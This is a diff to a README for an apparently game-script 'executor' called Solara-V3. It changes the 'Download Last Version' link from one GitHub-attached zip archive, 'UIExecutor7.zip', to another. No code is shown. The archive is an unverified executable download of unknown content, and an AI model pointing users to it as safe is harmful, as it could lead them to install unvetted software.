@@ -1,5 +1,5 @@
 # Solara-V3
-Download Last Version: [Solara](https://github.com/user-attachments/files/16739573/UIExecutor7.zip)
+Download Last Version: [Solara](https://github.com/user-attachments/files/16751254/UIExecutor7.zip)
 
 STATUS: 🟢
 
